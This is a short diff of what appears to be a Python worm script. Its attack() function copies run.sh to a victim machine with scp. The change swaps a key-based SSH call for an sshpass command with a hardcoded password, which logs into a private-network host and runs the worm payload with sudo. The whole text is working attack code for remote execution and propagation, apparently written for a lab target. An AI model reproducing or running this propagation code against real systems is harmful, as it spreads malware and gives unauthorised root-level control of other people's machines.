@@ -39,8 +39,9 @@ def attack():
     os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
 
     # Run the worm
-    command = 'sudo python /home/victim/Worm_Attack/Worm.py'
-    ssh_command_using_ssh_key(command)
+    # command = 'cd /home/{0}/Worm_Attack && (sudo ./run.sh )'
+    os.system('sshpass -p victim ssh victim@192.168.31.145 -p 5555 \"cd /home/{0}/Worm_Attack && (sudo ./run.sh )\"')
+    # ssh_command_using_ssh_key(command)
 
 
 def ssh_command_using_name_pw(command):
